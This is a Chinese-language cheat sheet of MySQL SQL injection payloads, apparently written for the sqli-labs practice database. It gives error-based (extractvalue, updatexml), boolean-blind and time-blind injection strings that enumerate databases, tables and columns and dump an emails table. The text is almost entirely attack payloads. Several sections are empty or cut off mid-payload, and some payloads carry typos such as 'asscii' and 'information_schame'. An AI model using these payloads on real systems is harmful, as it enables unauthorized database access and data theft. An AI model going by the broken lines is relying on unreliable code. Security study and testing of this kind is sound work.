## SQL注入之MySQL

### 一、联合注入


### 二、报错注入
<font color=#FF000 >1、使用extractvalue函数</font></br>

**-- （1）查询数据库名字（用户user()；版本version()）**
```Python
?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))%23
```
**-- （2）查询数据库有多少个表**
```Python
?id=1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))%23
```
**-- （3）查询数据库的表名，limit后面第一个数字表示第几个表**
```Python
?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23
```
**-- （4）查询列名，limit后数字表示第几列**
```Python
?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))%23
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='emails'),0x7e))%23
```
**-- （5）查询表里面某列的内容**
```Python
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e))%23
```
<font color=#FF000 >2、使用updatexml函数</font></br>

**-- （1）查询数据库名字，数据库名字为security（用户user()；版本version()）**
```Python
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23		
```
**-- （2）查询数据库有多少个表**
```Python
?id=1' and updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23	
```
**-- （3）查询数据库的表名，limit后第一个数字表示第几个表**
```Python
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)%23	
```
**-- （4）查询列名，limit后数字表示第几列**
```Python
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1)%23	
```
**-- （5）查询表里面某列的内容**
```Python
?id=1' and updatexml(1,concat(0x7e,(select group_concat(email_id) from security.emails),0x7e),1)%23	
```



### 三、布尔盲注
**-- 1#获得数据库名长度为8**
```Python
?id=1' and (length(database())=8)%23		#有回显
```
**-- 2#获得数据库名**
```Python
?id=1' and ascii(substr(database(),1,1))<100 %23		#无回显
?id=1' and ascii(substr(database(),1,1))=115 %23		#有回显
```
**-- 3#获得数据库表名个数**
```Python
?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4%23	#有回显
```
**-- 4#获得数据库表名长度**
```Python
?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6%23	
```
**-- 5#获得数据库表名**
```Python
?id=1' and ascii((substr ((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)))=106%23
```
**-- 6#获取列名**</br>

**-- 7#获得数据**

### 四、时间盲注
**1#获得数据库名长度**
```Python
?id=1' and if((length(database())>5),sleep(5),1)%23	    #有时间延迟，说明判断正确
?id=1' and if((length(database())>9),sleep(5),1)%23	    #无时间延迟，说明判断错误
?id=1' and if((length(database())>5),1,sleep(5))%23	    #无时间延迟，说明判断正确
```
**2#获得数据库名**
```Python
?id=1' and if((ascii(substr(database(),1,1))>100,sleep(5),1))%23		#有无回显
```
**3#获得表名（同理先获取长度）**
```Python
?id=1' and if((asscii(substr((select table_name from information_schame.tables where table_schame=database() limit 0,1),1,1)))>100,sleep(5),1)		#有无回显
```
**4#获取数据库列名（先拿列长度？）**
```Python
?id=1' and if
```
**5#获取数据**
```Python
?id=1' and if
```
